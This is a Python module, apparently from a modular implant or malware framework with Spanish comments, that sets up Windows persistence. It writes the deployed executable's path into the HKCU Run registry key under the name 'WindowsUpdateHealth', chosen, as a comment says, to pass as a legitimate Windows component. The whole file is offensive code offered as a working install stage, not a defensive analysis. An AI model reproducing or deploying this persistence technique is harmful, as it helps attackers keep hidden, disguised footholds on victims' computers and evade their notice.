# Labels
__RESOURCE_TYPE__ = "DYNAMIC"
__PLATFORM_COMPATIBILITY__ = ["WINDOWS"]
__ARCHITECTURE_COMPATIBILITY__ = ["ALL"]
__SELECTABLE__ = True
__ELEMENT_NAME__ = __package__
__CONFIGURABLE__ = True
__STATIC_CONFIGURATIONS__ = {
    "REGISTRY_VALUE_NAME": {
        "SYSTEM_NAME": "REGISTRY_VALUE_NAME",
        "SYMBOLIC_NAME": "Registry Value Name",
        "DESCRIPTION": "Nombre de la entrada en el registro de Windows",
        "VALUE": {
            "DATA_TYPE": "str",
            "VALUE": "WindowsUpdateHealth", # Mimetismo: nombre discreto
            "DATA_CLASS": True,
            "__type__": "PrimitiveData"
        },
        "OPTIONAL": False,
        "PRIVATE": False
    }
}

# Library import
from ... import InstallationModule
import winreg
import os
import traceback

# Classes definition
class PersistenceModule(InstallationModule):
    # Class properties definition
    MODULE_NAME = "PERSISTENCE_REGISTRY_WINDOWS"
    INSTALL_STAGE = InstallationModule.INSTALL_STAGE_PROINSTALL
    
    def __init__(self, container, system) -> None:
        super().__init__(container, system)

    # Private methods
    def _set_registry_persistence(self, name: str, executable_path: str) -> bool:
        """Escribe la ruta del ejecutable en la llave Run de HKCU."""
        try:
            # Ruta de la llave: Software\Microsoft\Windows\CurrentVersion\Run
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            # Abrir la llave con permisos de escritura
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, 
                key_path, 
                0, 
                winreg.KEY_SET_VALUE
            )
            
            # Establecer el valor (REG_SZ) con la ruta del binario
            # Usamos comillas dobles en la ruta por si contiene espacios
            winreg.SetValueEx(key, name, 0, winreg.REG_SZ, f'"{executable_path}"')
            
            winreg.CloseKey(key)
            return True
        except Exception:
            traceback.print_exc()
            return False

    # Public methods
    def start(self) -> bool:
        # 1. Obtener la ruta del ejecutable ya desplegado (dbus-monitor)
        # El InstallManager ya actualizó esta ruta en el VFS en _deploy_resources
        program_executable_filepath = self.system.virtual_file_system.query("PROCESS_SOURCE_FILEPATH")
        
        # 2. Obtener el nombre configurado para el registro
        value_name = "WindowsUpdateHealth" #self.get_configuration("REGISTRY_VALUE_NAME")

        print(f"[{self.MODULE_NAME}] Setting persistence in Registry...")
        print(f"[{self.MODULE_NAME}] Target: {program_executable_filepath}")

        if self._set_registry_persistence(value_name, program_executable_filepath):
            print(f"[{self.MODULE_NAME}] Persistence established successfully.")
            return True
        else:
            print(f"[{self.MODULE_NAME}] Failed to set persistence.")
            return False

    def stop(self) -> bool:
        pass

    def configure(self, configurations) -> bool:
        pass